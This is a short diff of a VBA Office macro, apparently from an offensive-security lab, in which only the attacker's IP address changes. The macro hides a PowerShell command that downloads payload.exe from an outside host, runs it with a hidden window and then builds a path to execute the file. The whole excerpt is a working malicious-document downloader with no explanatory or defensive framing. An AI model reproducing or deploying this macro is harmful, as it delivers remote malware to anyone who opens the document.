@@ -44,7 +44,7 @@ End Sub
 
 Sub MyMacro()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/payload.exe', 'payload.exe')"
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.10.10/payload.exe', 'payload.exe')"
     Shell str, vbHide
     Dim exePath As String
     exePath = ActiveDocument.Path & "\" & "payload.exe"
